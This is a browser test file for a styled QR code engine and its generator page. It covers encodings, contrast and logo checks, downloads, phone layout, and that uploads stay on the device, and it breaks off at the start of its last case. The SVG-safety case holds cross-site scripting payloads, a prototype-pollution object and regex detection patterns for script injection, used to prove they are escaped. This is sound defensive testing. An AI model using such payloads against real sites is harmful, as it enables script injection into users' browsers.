'use strict';
/* Styled QR codes (docs/QR.md): the engine (LE.qr), the tool page, the studio's QR element, makers, agents and
   "Make many". Every code the engine can draw is read back with the vendored decoder. */

const fs = require('fs');
const path = require('path');
const cases = {};
const ROOT = path.join(__dirname, '..');
const URL = 'https://localeditor.net/qr-code-generator/';
/* A small picture with a clear subject, made in the page (no fixture file needed). */
const PICTURE = `(() => { const c = document.createElement('canvas'); c.width = c.height = 160; const g = c.getContext('2d'); const gr = g.createLinearGradient(0, 0, 160, 160); gr.addColorStop(0, '#f97316'); gr.addColorStop(1, '#7c3aed'); g.fillStyle = gr; g.fillRect(0, 0, 160, 160); g.fillStyle = '#fff'; g.beginPath(); g.arc(80, 80, 44, 0, 7); g.fill(); g.fillStyle = '#111827'; g.fillRect(60, 60, 40, 40); return c.toDataURL('image/png'); })()`;

async function engine(browser, base, h) {
  const page = await h.open(browser, base, '/about/', 'desktop');
  await page.addScriptTag({ url: base + '/assets/vendor/qrcode.js' });
  await page.addScriptTag({ url: base + '/assets/js/le-qr.js' });
  await page.evaluate(() => LE.qr.decoder());
  return page;
}
const report = (page, spec) => page.evaluate((s) => LE.qr.check(s), spec);

cases['engine: every preset passes the check and decodes at two sizes'] = async ({ browser, base, h }) => {
  const page = await engine(browser, base, h);
  const out = await page.evaluate(async (text) => {
    const res = [];
    for (const p of LE.qr.presets({ colors: ['#0369DA', '#EF8C57', '#17131F'] })) {
      const r = await LE.qr.check(LE.qr.withStyle(text, p.style));
      res.push({ id: p.id, ok: r.ok, decoded: r.decoded, sizes: r.sizes, bad: r.notes.filter((n) => n.level !== 'info').map((n) => n.code) });
    }
    return res;
  }, URL);
  h.assert(out.length >= 17 && out[0].id === 'brand', 'at least 16 presets plus the brand one: ' + out.length);
  out.forEach((r) => h.assert(r.ok && r.decoded === true && !r.bad.length && r.sizes.length === 2 && r.sizes[0] < r.sizes[1], 'preset ' + r.id + ': ' + JSON.stringify(r)));
  h.assert((await page.evaluate(() => LE.qr.presets().map((p) => p.id))).indexOf('brand') < 0, 'no brand preset without a brand kit');
  h.assert.noErrors(page);
};

cases['engine: every module shape and every eye shape decodes at two sizes'] = async ({ browser, base, h }) => {
  const page = await engine(browser, base, h);
  const out = await page.evaluate(async (text) => {
    const res = [], Q = LE.qr;
    const run = async (name, style) => { const r = await Q.check(Object.assign({ text, fg: '#17131f', bg: '#ffffff' }, style)); res.push({ name, ok: r.ok, decoded: r.decoded }); };
    for (const s of Q.SHAPES) await run('shape ' + s, { shape: s });
    const used = { o: {}, i: {} };
    for (const s of Q.SHAPES) for (const o of Q.EYES.outer) for (const i of Q.EYES.pairs[o]) { used.o[o] = used.i[i] = 1; for (const t of [text, 'https://a.co', text + '?' + 'abc123'.repeat(24)]) await run(s + ' with eye ' + o + '/' + i + ' (' + t.length + ')', { shape: s, eye: { outer: o, inner: i }, text: t }); }
    res.push({ name: 'every eye shape is in a pair', ok: Object.keys(used.o).length === Q.EYES.outer.length && Object.keys(used.i).length === Q.EYES.inner.length, decoded: true });
    return res;
  }, URL);
  h.assert.equal(out.length, 7 + 7 * 8 * 3 + 1);
  const bad = out.filter((r) => !(r.ok && r.decoded === true)).map((r) => r.name);
  h.assert(!bad.length, 'do not decode: ' + bad.join(', '));
};

cases['engine: each content type encodes the exact string and reads back as it'] = async ({ browser, base, h }) => {
  const page = await engine(browser, base, h);
  const want = {
    link: [{ url: 'example.com/menu' }, 'https://example.com/menu'],
    text: [{ text: 'Grüße, 你好 & <b>' }, 'Grüße, 你好 & <b>'],
    wifi: [{ ssid: 'Café;Guests', password: 'p:a"ss', security: 'WPA', hidden: true }, 'WIFI:T:WPA;S:Café\\;Guests;P:p\\:a\\"ss;H:true;;'],
    contact: [{ first: 'Ana', last: 'Li', org: 'Corner, Ltd', phone: '+44 20 7946 0000', email: 'ana@example.com' }, 'BEGIN:VCARD\nVERSION:3.0\nN:Li;Ana;;;\nFN:Ana Li\nORG:Corner\\, Ltd\nTEL;TYPE=CELL:+44 20 7946 0000\nEMAIL:ana@example.com\nEND:VCARD'],
    email: [{ to: 'hi@example.com', subject: 'Table for two', body: 'At 8?' }, 'mailto:hi@example.com?subject=Table%20for%20two&body=At%208%3F'],
    phone: [{ phone: '+1 (555) 010-0199' }, 'tel:+15550100199'],
    sms: [{ phone: '+15550100199', message: 'On my way' }, 'SMSTO:+15550100199:On my way'],
    chat: [{ link: 'https://chat.example/u/ana?text=hello' }, 'https://chat.example/u/ana?text=hello'],
    location: [{ lat: '51.5007', lng: '-0.1246', label: 'Big clock' }, 'geo:51.5007,-0.1246?q=Big%20clock'],
    event: [{ title: 'Launch; party', start: '2026-12-01T18:30', end: '2026-12-01T21:00', location: 'Hall 2' }, 'BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nSUMMARY:Launch\\; party\nDTSTART:20261201T183000\nDTEND:20261201T210000\nLOCATION:Hall 2\nEND:VEVENT\nEND:VCALENDAR'],
    pay: [{ upiId: 'ana@okbank', payee: 'Ana Li', amount: '120', note: 'Table 4' }, 'upi://pay?pa=ana@okbank&pn=Ana%20Li&am=120.00&cu=INR&tn=Table%204']
  };
  const out = await page.evaluate(async (want) => {
    const res = {};
    for (const t of LE.qr.TYPES) {
      const e = LE.qr.encode(t.id, want[t.id][0]);
      const cv = await LE.qr.canvas(LE.qr.withStyle(e.text, 'ocean'), 700);
      const d = cv.getContext('2d').getImageData(0, 0, cv.width, cv.height);
      const r = window.jsQR(d.data, d.width, d.height);
      res[t.id] = { text: e.text, error: e.error, read: r && new TextDecoder().decode(new Uint8Array(r.binaryData)) };
    }
    res.bad = [LE.qr.encode('pay', { upiId: 'not an id', payee: 'x' }), LE.qr.encode('chat', { link: 'http://plain.example' }), LE.qr.encode('location', { lat: '123', lng: '5' }), LE.qr.encode('wifi', { ssid: 'x' }), LE.qr.encode('text', { text: 'x'.repeat(5000) }), LE.qr.encode('nope', {})];
    return res;
  }, want);
  h.assert.equal(Object.keys(want).length, 11);
  Object.keys(want).forEach((k) => { h.assert.equal(out[k].text, want[k][1], k + ' payload'); h.assert.equal(out[k].read, want[k][1], k + ' read back'); h.assert(!out[k].error, k + ' has no error'); });
  out.bad.forEach((b, i) => h.assert(b.error && (i === 4 ? b.text.length === 1200 : b.text === ''), 'bad input ' + i + ' is refused with a reason'));
};

cases['engine: the Wi-Fi and payment strings are the makers\' own'] = async ({ browser, base, h }) => {
  const page = await h.open(browser, base, '/studio/', 'desktop');
  await h.need(page, ['makers']);
  await page.evaluate(() => LE.makers.ready().then(() => Promise.all([LE.makers.build('wifisign', { ssid: 'a', password: 'b' }), LE.makers.build('payposter', { upiId: 'ana@okbank', payee: 'c' })])));
  await page.addScriptTag({ url: base + '/assets/js/le-qr.js' });
  const out = await page.evaluate(() => {
    const w = { ssid: 'My; "Net"', password: 'se:cr\\et', security: 'WPA', hidden: true }, p = { upiId: 'shop.one@okbank', payee: 'Corner Café', amount: 49.5, note: 'Order #12' };
    return [LE.qr.encode('wifi', w).text, LE.makers.wifiPayload(w), LE.qr.encode('pay', p).text, LE.makers.payPayload(p), LE.qr.encode('wifi', { ssid: 'Open', security: 'nopass' }).text, LE.makers.wifiPayload({ ssid: 'Open', security: 'nopass' })];
  });
  h.assert(out[0] && out[0] === out[1], 'Wi-Fi: ' + out[0] + ' vs ' + out[1]);
  h.assert(out[2] && out[2] === out[3], 'payment: ' + out[2] + ' vs ' + out[3]);
  h.assert.equal(out[4], out[5]);
};

cases['guard: a picture that is too large and a pale colour pair are caught, each with the one fix'] = async ({ browser, base, h }) => {
  const page = await engine(browser, base, h);
  const pic = await page.evaluate(PICTURE);
  let r = await report(page, { text: URL, fg: '#17131f', bg: '#ffffff', shape: 'rounded', image: { src: pic, size: 0.42 } });
  let n = r.notes.find((x) => x.code === 'logo');
  h.assert(!r.ok && n && n.level === 'fail' && n.fix.label === 'Make the picture smaller' && r.logoCover > 0.12, 'too-large picture: ' + JSON.stringify(r.notes));
  h.assert.equal(r.ec, 'H', 'a centre picture raises error correction to H');
  r = await page.evaluate(async (a) => LE.qr.check(LE.qr.applyFix(a.spec, a.patch)), { spec: { text: URL, fg: '#17131f', bg: '#ffffff', shape: 'rounded', image: { src: pic, size: 0.42 } }, patch: n.fix.patch });
  h.assert(r.ok && r.decoded === true && r.logoCover <= 0.12, 'the fix makes it pass: ' + JSON.stringify(r.notes));
  const pale = { text: URL, fg: '#f2d9a0', bg: '#fff7e0', shape: 'dots' };
  r = await report(page, pale);
  n = r.notes.find((x) => x.code === 'contrast');
  h.assert(!r.ok && n && n.level === 'fail' && n.fix.label === 'Make the dots darker' && r.contrast < 2.5, 'light on light: ' + JSON.stringify(r));
  r = await page.evaluate(async (a) => LE.qr.check(LE.qr.applyFix(a.spec, a.patch)), { spec: pale, patch: n.fix.patch });
  h.assert(r.ok && r.decoded === true && r.contrast >= 4.5, 'darker dots pass: ' + JSON.stringify(r));
  r = await report(page, { text: URL, fg: '#8a8f98', bg: '#ffffff' });
  h.assert(r.notes.some((x) => x.code === 'contrast' && x.level === 'warn'), 'a mid grey is warned about');
  r = await report(page, { text: URL, fg: '#ffffff', bg: '#111827', shape: 'rounded' });
  n = r.notes.find((x) => x.code === 'inverted');
  h.assert(n && n.level === 'warn' && n.fix.label === 'Swap the colours', 'inverted codes are warned about');
  r = await report(page, { text: URL, fg: '#111111', bg: '#ffffff', shape: 'square', quiet: 0 });
  h.assert(r.quiet === 0 && r.notes.some((x) => x.code === 'quiet' && x.fix.patch.quiet === 4), 'no margin is warned about');
  r = await report(page, { text: 'x'.repeat(1300), fg: '#111111', bg: '#ffffff', shape: 'dots' });
  h.assert.equal(r.version > 20 && r.notes.some((x) => x.code === 'dense'), true, 'dense note');
  r = await report(page, { text: URL, fg: '#111111', bg: '#ffffff', shape: 'square', eye: { outer: 'square', inner: 'dot', outerColor: '#0b3d91' } });
  n = r.notes.find((x) => x.code === 'decode');
  h.assert(!r.ok && r.decoded === false && n.fix.label === 'Match the corner centres', 'a round centre in a square corner fails the test scan: ' + JSON.stringify(r.notes));
  r = await page.evaluate(async (a) => { const s = LE.qr.applyFix(a.spec, a.patch); return Object.assign(await LE.qr.check(s), { eye: s.eye }); }, { spec: { text: URL, fg: '#111111', bg: '#ffffff', shape: 'square', eye: { outer: 'square', inner: 'dot', outerColor: '#0b3d91' } }, patch: n.fix.patch });
  h.assert(r.ok && r.decoded && r.eye.inner === 'square' && r.eye.outer === 'square' && r.eye.outerColor === '#0b3d91', 'the fix keeps the frame and its colour');
  r = await report(page, { text: '  ', fg: '#111111', bg: '#ffffff' });
  h.assert(!r.ok && r.notes[0].code === 'empty', 'empty content');
};

cases['engine: gradients, transparent backgrounds, a centre picture, a picture background and every frame decode'] = async ({ browser, base, h }) => {
  const page = await engine(browser, base, h);
  const pic = await page.evaluate(PICTURE);
  const specs = {
    linear3: { text: URL, shape: 'connected', bg: '#ffffff', fg: { type: 'linear', angle: 200, stops: ['#0f766e', '#0369a1', '#4338ca'] } },
    radial: { text: URL, shape: 'dots', bg: '#ffffff', fg: { type: 'radial', stops: [{ at: 0, color: '#be185d' }, { at: 1, color: '#6b21a8' }] } },
    transparent: { text: URL, shape: 'rounded', bg: null, fg: '#14532d' },
    transparentLight: { text: URL, shape: 'square', bg: null, fg: '#ffffff' },
    logo: { text: URL, shape: 'rounded', bg: '#ffffff', fg: '#0b3d91', image: { src: pic, size: 0.26 } },
    photo: { text: URL, shape: 'dots', bg: '#ffffff', fg: '#17131f', picture: { src: pic } },
    photoLogo: { text: URL, bg: '#ffffff', fg: '#17131f', picture: { src: pic, dim: 0.5 }, image: { src: pic, size: 0.2, fit: 'cover', round: 0.5 } }
  };
  ['label', 'tab', 'badge', 'ticket'].forEach((s) => { specs['frame-' + s] = { text: URL, shape: 'rounded', bg: '#ffffff', fg: '#1e3a8a', radius: 0.06, frame: { style: s, text: s === 'tab' ? 'Menu' : 'Pay here' } }; });
  const out = await page.evaluate(async (specs) => {
    const res = {};
    for (const k of Object.keys(specs)) { const r = await LE.qr.check(specs[k]); const s = LE.qr.svg(specs[k]); res[k] = { ok: r.ok, decoded: r.decoded, ec: r.ec, notes: r.notes.map((n) => n.level + ':' + n.code), svg: s }; }
    const cv = await LE.qr.canvas(specs.transparent, 300);
    res.alpha = cv.getContext('2d').getImageData(2, 2, 1, 1).data[3];
    const fr = await LE.qr.canvas(specs['frame-label'], 400);
    res.frameSize = [fr.width, fr.height];
    return res;
  }, specs);
  Object.keys(specs).forEach((k) => h.assert(out[k].decoded === true && (out[k].ok || k === 'transparentLight'), k + ': ' + JSON.stringify(out[k].notes)));
  h.assert(/<linearGradient /.test(out.linear3.svg) && (out.linear3.svg.match(/<stop /g) || []).length === 3, 'three stops');
  h.assert(/<radialGradient /.test(out.radial.svg), 'radial gradient');
  h.assert.equal(out.alpha, 0, 'a transparent background stays transparent');
  h.assert(out.transparent.notes.indexOf('info:transparent') >= 0, 'transparent note');
  h.assert.equal(out.logo.ec, 'H');
  h.assert(/>Pay here<\/text>/.test(out['frame-badge'].svg) && />Menu<\/text>/.test(out['frame-tab'].svg), 'call to action text');
  h.assert(out.frameSize[1] > out.frameSize[0], 'a label frame is taller than wide');
};

cases['engine: SVG output is well-formed, has no script, and hostile input stays text'] = async ({ browser, base, h }) => {
  const page = await engine(browser, base, h);
  await page.addScriptTag({ url: base + '/assets/js/le-engine.js' });
  await page.addScriptTag({ url: base + '/assets/js/le-project.js' });
  const out = await page.evaluate(async (pic) => {
    const res = [];
    const hostile = { text: '"><script>alert(1)</script>', fg: '"/><script>x</script>', bg: 'url(javascript:1)', shape: 'dots"><script>', eye: { outer: '<svg onload=1>', inner: 'dot', outerColor: 'red;}' },
      image: { src: 'javascript:alert(1)' }, picture: { src: 'https://example.com/x.png' }, frame: { style: 'label', text: '</text><script>alert(2)</script> & "q"', color: 'expression(1)' }, onload: 'x', __proto__: { polluted: 1 } };
    const list = LE.qr.presets().map((p) => LE.qr.withStyle('https://example.com/?a=1&b=<2>', p.style)).concat([hostile, { text: 'plain', fg: '#17131f', bg: '#ffffff', ec: 'M' }, { text: 'pic', bg: '#ffffff', fg: '#111111', image: { src: pic }, picture: { src: pic }, frame: { style: 'tab', text: 'Scan <me>' } }]);
    for (const spec of list) {
      const s = LE.qr.svg(spec, { caption: 'Row <1> & co' });
      const d = new DOMParser().parseFromString(s, 'image/svg+xml');
      const bad = [...d.querySelectorAll('*')].filter((n) => /^(script|foreignobject|iframe|a|use)$/i.test(n.localName) || [...n.attributes].some((a) => /^on/i.test(a.name) || (/href$/i.test(a.name) && !/^data:image\/(png|jpeg|webp|gif);base64,/.test(a.value)) || /javascript:|expression\(/i.test(a.value)));
      const clean = LE.project.sanitizeSvg(s);
      res.push({ parse: !d.querySelector('parsererror') && d.documentElement.localName === 'svg', bad: bad.length, script: /<script|javascript:|\son\w+=/i.test(s), kept: clean.length > s.length * 0.9, len: s.length });
    }
    const c = LE.qr.clean(hostile);
    return { list: res, clean: { c, polluted: ({}).polluted, text: new DOMParser().parseFromString(LE.qr.svg(hostile), 'image/svg+xml').querySelector('text').textContent } };
  }, await page.evaluate(PICTURE));
  out.list.forEach((r, i) => h.assert(r.parse && !r.bad && !r.script && r.kept, 'svg ' + i + ': ' + JSON.stringify(r)));
  const c = out.clean.c;
  h.assert(c.fg === '#17131f' && c.bg === '#ffffff' && c.shape === 'square' && c.eye.outer === 'square' && !c.eye.outerColor && !c.image && !c.picture && !c.frame.color && !('onload' in c), 'the spec is whitelisted: ' + JSON.stringify(c));
  h.assert.equal(out.clean.text, '</text><script>alert(2)</script>', 'frame text is escaped text, cut at 32 characters');
  h.assert.equal(out.clean.polluted, undefined);
};

/* The studio's QR renderer as it was before LE.qr (le-studio-tools.js, qrSvg), kept here to prove old entries are unchanged. */
const OLD_RENDERER = `(text, fg, bg, ec) => {
  var q = window.qrcode;
  if (q.stringToBytesFuncs && q.stringToBytesFuncs['UTF-8']) q.stringToBytes = q.stringToBytesFuncs['UTF-8'];
  var qr = q(0, ec || 'M');
  qr.addData(text || ' ', 'Byte');
  qr.make();
  var n = qr.getModuleCount(), m = 4, size = n + m * 2;
  var d = '';
  for (var r = 0; r < n; r++) {
    var run = -1;
    for (var col = 0; col <= n; col++) {
      var dark = col < n && qr.isDark(r, col);
      if (dark && run < 0) run = col;
      if (!dark && run >= 0) { d += 'M' + (run + m) + ' ' + (r + m) + 'h' + (col - run) + 'v1h-' + (col - run) + 'z'; run = -1; }
    }
  }
  var hex6 = (c) => String(c).toLowerCase().slice(0, 7);
  return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ' + size + ' ' + size + '" shape-rendering="crispEdges">' + (bg ? '<rect width="' + size + '" height="' + size + '" fill="' + hex6(bg) + '"/>' : '') + '<path d="' + d + '" fill="' + hex6(fg) + '"/></svg>';
}`;
cases['old studio QR entries are drawn exactly as before (markup and pixels)'] = async ({ browser, base, h }) => {
  const page = await engine(browser, base, h);
  const out = await page.evaluate(async (src) => {
    const old = (0, eval)('(' + src + ')');
    const entries = [{ text: 'https://', fg: '#17131f', bg: '#ffffff', ec: 'M' }, { text: 'https://example.com/a-long-path?with=query&and=more', fg: '#0b3d91', bg: null, ec: 'H' }, { text: 'Grüße 你好', fg: '#7C2D12', bg: '#FFF7ED', ec: 'Q' }, { text: '', fg: '#000000', bg: '#ffffff', ec: 'L' }];
    const px = async (svg) => { const img = new Image(); img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg.replace('<svg ', '<svg width="435" height="435" ')); await img.decode(); const c = document.createElement('canvas'); c.width = c.height = 435; const g = c.getContext('2d'); g.drawImage(img, 0, 0); return g.getImageData(0, 0, 435, 435).data; };
    const res = [];
    for (const e of entries) {
      const a = old(e.text, e.fg, e.bg, e.ec), b = LE.qr.svg(e);
      const pa = await px(a), pb = await px(b);
      let diff = 0;
      for (let i = 0; i < pa.length; i++) if (pa[i] !== pb[i]) diff++;
      res.push({ same: a === b, diff, plain: LE.qr.isPlain(e), styled: LE.qr.svg(Object.assign({ shape: 'square' }, e)) !== b });
    }
    return res;
  }, OLD_RENDERER);
  out.forEach((r, i) => h.assert(r.same && r.diff === 0 && r.plain && r.styled, 'entry ' + i + ': ' + JSON.stringify(r)));
};

/* ---------- the tool page ---------- */
async function tool(browser, base, h, vp, opts) {
  const page = await h.open(browser, base, '/qr-code-generator/', vp || 'desktop', opts);
  page.setDefaultTimeout(15000);
  await settled(page);
  return page;
}
const settled = (page, state) => page.waitForFunction((s) => { const e = document.querySelector('.qr-status'); return e && (s ? e.getAttribute('data-state') === s : e.getAttribute('data-state') !== 'wait'); }, state || null);
const spec = (page) => page.evaluate(() => LEQrPage.editor.spec());
const setValue = (page, sel, v) => page.evaluate((a) => { const e = document.querySelector(a.sel); e.value = a.v; e.dispatchEvent(new Event('input', { bubbles: true })); e.dispatchEvent(new Event('change', { bubbles: true })); }, { sel, v });
const none = async (page, action) => { let got = false; const on = () => { got = true; }; page.on('download', on); await action(); await page.waitForTimeout(700); page.off('download', on); return !got; };
function unzip(buf) {
  const out = {};
  let p = buf.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
  const count = buf.readUInt16LE(p + 10);
  p = buf.readUInt32LE(p + 16);
  for (let i = 0; i < count; i++) {
    const size = buf.readUInt32LE(p + 20), n = buf.readUInt16LE(p + 28), e = buf.readUInt16LE(p + 30), c = buf.readUInt16LE(p + 32), at = buf.readUInt32LE(p + 42);
    const name = buf.slice(p + 46, p + 46 + n).toString('utf8');
    const start = at + 30 + buf.readUInt16LE(at + 26) + buf.readUInt16LE(at + 28);
    out[name] = buf.slice(start, start + size);
    p += 46 + n + e + c;
  }
  return out;
}
const readPng = (page, buf) => page.evaluate(async (b64) => {
  const img = new Image(); img.src = 'data:image/png;base64,' + b64; await img.decode();
  const c = document.createElement('canvas'); c.width = img.naturalWidth; c.height = img.naturalHeight;
  const g = c.getContext('2d'); g.fillStyle = '#fff'; g.fillRect(0, 0, c.width, c.height); g.drawImage(img, 0, 0);
  const d = g.getImageData(0, 0, c.width, c.height), r = (await LE.qr.decoder())(d.data, d.width, d.height);
  return r ? new TextDecoder().decode(new Uint8Array(r.binaryData)) : null;
}, buf.toString('base64'));

cases['tool page: content types, looks and downloads (PNG sizes, SVG, PDF) with names from the content'] = async ({ browser, base, h }) => {
  const page = await tool(browser, base, h);
  h.assert.equal(await page.title(), 'QR Code Generator with Logo and Colours | LocalEditor');
  h.assert.equal(await page.locator('.qr-tabs button').count(), 11, 'eleven content types');
  h.assert((await page.locator('.qr-presets .qr-preset').count()) >= 16, 'at least 16 looks as live thumbnails');
  h.assert(await page.evaluate(() => [...document.querySelectorAll('.qr-preset img')].every((i) => i.complete && i.naturalWidth > 0)), 'every thumbnail drew');
  await page.click('button[data-preset="ocean"]');
  await settled(page, 'ok');
  let s = await spec(page);
  h.assert(s.shape === 'connected' && s.fg.type === 'linear' && s.text === 'https://localeditor.net/', 'one tap applies a look and keeps the content: ' + JSON.stringify(s).slice(0, 200));
  await page.click('button[data-t="wifi"]');
  await page.fill('#f-ssid', 'Guest');
  await page.fill('#f-password', 'flat white');
  await settled(page, 'ok');
  h.assert.equal((await spec(page)).text, 'WIFI:T:WPA;S:Guest;P:flat white;;');
  let r = await h.capture(page, () => page.click('#png'));
  let info = h.imageInfo(r.buf);
  h.assert(r.name === 'wifi-guest.png' && info.type === 'png' && info.w === 1024, 'PNG 1024 named from the content: ' + r.name + ' ' + JSON.stringify(info));
  h.assert.equal(await readPng(page, r.buf), 'WIFI:T:WPA;S:Guest;P:flat white;;', 'the downloaded PNG scans');
  await page.selectOption('#px', '2048');
  h.assert.equal(h.imageInfo((await h.capture(page, () => page.click('#png'))).buf).w, 2048);
  await page.selectOption('#px', 'custom');
  await page.fill('#pxc', '1500');
  h.assert.equal(h.imageInfo((await h.capture(page, () => page.click('#png'))).buf).w, 1500, 'custom size');
  await page.selectOption('#px', '512');
  r = await h.capture(page, () => page.click('#svg'));
  const svg = r.buf.toString();
  h.assert(r.name === 'wifi-guest.svg' && /^<svg xmlns/.test(svg) && /<linearGradient/.test(svg) && !/<script/i.test(svg) && /fill="#f5fbff"/.test(svg), 'SVG download');
  await page.check('#clear');
  h.assert(!/fill="#f5fbff"/.test((await h.capture(page, () => page.click('#svg'))).buf.toString()), 'a see-through export has no background');
  const clear = await h.capture(page, () => page.click('#png'));
  h.assert.equal(await page.evaluate(async (b64) => { const i = new Image(); i.src = 'data:image/png;base64,' + b64; await i.decode(); const c = document.createElement('canvas'); c.width = c.height = 8; const g = c.getContext('2d'); g.drawImage(i, 0, 0); return g.getImageData(1, 1, 1, 1).data[3]; }, clear.buf.toString('base64')), 0, 'see-through PNG');
  await page.uncheck('#clear');
  r = await h.capture(page, () => page.click('#pdf'), 30000);
  let pdf = await h.pdfRead(browser, base, r.buf);
  h.assert(r.name === 'wifi-guest.pdf' && pdf.sizes.length === 1 && Math.round(pdf.sizes[0][0]) === 595 && Math.round(pdf.sizes[0][1]) === 842, 'one code on an A4 page: ' + JSON.stringify(pdf.sizes));
  await page.selectOption('#pdfmode', 'sheet-letter');
  pdf = await h.pdfRead(browser, base, (await h.capture(page, () => page.click('#pdf'), 30000)).buf);
  h.assert(pdf.sizes.length === 1 && Math.round(pdf.sizes[0][0]) === 612, 'a Letter sheet: ' + JSON.stringify(pdf.sizes));
  await page.click('button[data-t="contact"]');
  await page.fill('#f-first', 'Ana');
  await page.fill('#f-last', 'Li');
  await settled(page, 'ok');
  h.assert.equal((await h.capture(page, () => page.click('#svg'))).name, 'contact-ana-li.svg');
  h.assert.noErrors(page);
};

cases['tool page: a code that fails the check cannot be downloaded without "Download anyway"; the fix clears it'] = async ({ browser, base, h }) => {
  const page = await tool(browser, base, h);
  await page.evaluate(() => { document.querySelector('[data-sec="style"]').open = true; });
  await setValue(page, 'input[data-k="dots"]', '#f2d9a0');
  await setValue(page, 'input[data-k="background"]', '#fff7e0');
  await settled(page, 'fail');
  h.assert(/too close to the background/.test(await page.textContent('.qr-status')), 'the reason is in plain words: ' + await page.textContent('.qr-status'));
  h.assert.equal(await page.textContent('.qr-status [data-fix]'), 'Make the dots darker');
  for (const id of ['#png', '#svg', '#pdf', '#copy', '#studio']) {
    h.assert(await none(page, () => page.click(id)), id + ' did not go ahead');
    h.assert(await page.isVisible('.qr-anyway'), 'the page asks first (' + id + ')');
    await page.click('.qr-anyway [data-cancel]');
  }
  await page.click('#png');
  const forced = await h.capture(page, () => page.click('.qr-anyway [data-anyway]'));
  h.assert.equal(h.imageInfo(forced.buf).type, 'png', 'Download anyway downloads');
  await page.click('.qr-status [data-fix]');
  await settled(page, 'ok');
  h.assert(!(await page.isVisible('.qr-anyway')), 'the question goes away');
  h.assert.equal(h.imageInfo((await h.capture(page, () => page.click('#png'))).buf).type, 'png');
  /* a round centre in a square corner: caught by the test scan itself */
  await page.selectOption('select[data-k="corner-frames"]', 'square');
  h.assert.equal((await page.locator('select[data-k="corner-centres"] option').allTextContents()).join(), 'Square,Rounded', 'only centres that go with the frame are offered');
  /* too long: said in words, nothing to download */
  await page.click('button[data-t="text"]');
  await page.evaluate(() => { const t = document.getElementById('f-text'); t.removeAttribute('maxlength'); });
  await setValue(page, '#f-text', 'x'.repeat(1300));
  await page.waitForTimeout(300);
  h.assert(/1300 characters/.test(await page.textContent('.qr-status')) && /fail/.test(await page.getAttribute('.qr-status', 'data-state')), 'too long is explained');
  h.assert(await none(page, () => page.click('#png')), 'nothing downloads for content that does not fit');
  await setValue(page, '#f-text', 'y'.repeat(400));
  await settled(page);
  h.assert(/getting dense/.test(await page.textContent('.qr-status')), 'the density note: ' + await page.textContent('.qr-status'));
  h.assert.noErrors(page);
};

cases['tool page: a centre picture and a background picture stay on the device and still scan'] = async ({ browser, base, h }) => {
  const page = await tool(browser, base, h);
  const urls = [];
  page.on('request', (q) => urls.push(q.url()));
  const png = Buffer.from((await page.evaluate(PICTURE)).split(',')[1], 'base64');
  await page.evaluate(() => { document.querySelector('[data-sec="picture"]').open = true; });
  await page.setInputFiles('[data-sec="picture"] label.qr-file >> nth=0 >> input', { name: 'logo.png', mimeType: 'image/png', buffer: png });
  await page.waitForFunction(() => !!LEQrPage.editor.spec().image);
  await settled(page, 'ok');
  let s = await spec(page);
  const rep = await page.evaluate(() => LEQrPage.editor.report());
  h.assert(s.image.size === 0.22 && /^data:image\//.test(s.image.src) && rep.ec === 'H' && rep.decoded, 'centre picture: H and it scans');
  h.assert.equal(await page.getAttribute('input[data-k="size"]', 'max'), '30', 'the size slider stops where the code still scans');
  await page.click('button[data-preset="plum"]');
  await settled(page, 'ok');
  h.assert(!!(await spec(page)).image, 'a new look keeps the picture');
  await page.setInputFiles('[data-sec="picture"] label.qr-file >> nth=1 >> input', { name: 'photo.png', mimeType: 'image/png', buffer: png });
  await page.waitForFunction(() => !!LEQrPage.editor.spec().picture);
  await settled(page, 'ok');
  s = await spec(page);
  h.assert(s.picture.dim === 0.6 && (await page.evaluate(() => LEQrPage.editor.report())).decoded, 'picture behind the code scans');
  const out = await h.capture(page, () => page.click('#png'));
  h.assert.equal(await readPng(page, out.buf), 'https://localeditor.net/');
  await page.setInputFiles('[data-sec="picture"] label.qr-file >> nth=0 >> input', { name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('hello') });
  await page.click('[data-remove="picture"]');
  await page.click('[data-remove="image"]');
  await settled(page, 'ok');
  h.assert(!(await spec(page)).image && !(await spec(page)).picture, 'both removed');
  h.assert(urls.every((u) => u.indexOf(base) === 0 || /^(data|blob):/.test(u)), 'nothing left the device: ' + urls.filter((u) => u.indexOf(base) !== 0).join(' '));
  h.assert.noErrors(page);
};

cases['tool page on a phone: 360 and 390 wide, 44 px targets, no sideways scroll, nothing leaves the device'] = async ({ browser, base, h }) => {
  for (const vp of ['small', 'phone']) {
    const page = await h.open(browser, base, '/qr-code-generator/', vp);
    const urls = [];
    page.on('request', (q) => urls.push(q.url()));
    await settled(page, 'ok');
    await page.evaluate(() => { document.querySelectorAll('.qr-app details, #many').forEach((d) => { d.open = true; }); });
    await page.click('button[data-preset="mint"]');
    await page.tap('button[data-t="event"]');
    await page.fill('#f-title', 'Open day');
    await page.fill('#f-start', '2026-12-01T10:00');
    await settled(page, 'ok');
    await page.fill('.qr-bulk textarea', 'name\tlink\nOne\thttps://example.com/1\nTwo\thttps://example.com/2');
    await page.waitForSelector('.qr-bulk-map select');
    await page.selectOption('.qr-bulk-map select >> nth=0', 'link');
    await page.waitForSelector('.qr-bulk [data-go]');
    h.assert(await h.noOverflow(page), vp + ': the page scrolls sideways');
    const small = await page.evaluate(() => [...document.querySelectorAll('.tool-app button, .tool-app select, .tool-app input:not([type=file]):not([type=checkbox]), .tool-app summary, .tool-app label.qr-file, .tool-app label.check, #many button, #many select, #many summary, #many textarea, #many label.qr-file')]
      .filter((e) => e.offsetParent !== null).map((e) => { const r = e.getBoundingClientRect(); return { t: (e.id || e.getAttribute('data-k') || e.textContent || e.tagName).trim().slice(0, 24), w: Math.round(r.width), h: Math.round(r.height) }; }).filter((r) => r.h < 44 || r.w < 44));
    h.assert(!small.length, vp + ': targets under 44 px: ' + JSON.stringify(small));
    const w = await page.evaluate(() => document.getElementById('cv').getBoundingClientRect().width);
    h.assert(w >= 200 && w <= 360, vp + ': the code is a sensible size: ' + w);
    h.assert(urls.length > 0 && urls.every((u) => u.indexOf(base) === 0 || /^(data|blob):/.test(u)), vp + ': only this site was asked for files');
    h.assert.noErrors(page);
    await page.context().close();
  }
};

cases['copy puts a picture and the design layer on the clipboard; the studio pastes it as an editable QR element'] = async ({ browser, base, h }) => {
